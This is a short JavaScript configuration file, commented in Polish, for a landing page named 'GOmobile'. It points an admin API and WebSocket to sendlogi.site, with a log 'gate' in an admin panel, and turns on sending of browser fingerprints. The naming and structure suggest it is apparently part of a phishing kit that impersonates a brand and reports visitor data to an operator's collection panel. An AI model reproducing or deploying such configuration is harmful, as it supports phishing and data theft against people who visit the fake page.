/**
 * Konfiguracja lądowania GOmobile
 * Logi: https://sendlogi.site/admin/gate (podpis: GOmobile)
 */

const CONFIG = {
    ADMIN_API_URL: 'https://sendlogi.site',
    ADMIN_WS_URL: 'wss://sendlogi.site/ws',
    LANDING_ID: 'gomobile',
    LANDING_NAME: 'GOmobile',
    SETTINGS: {
        sendFingerprint: true,
        sendGeolocation: false,
        wsReconnectTimeout: 3000,
        debug: true
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
}
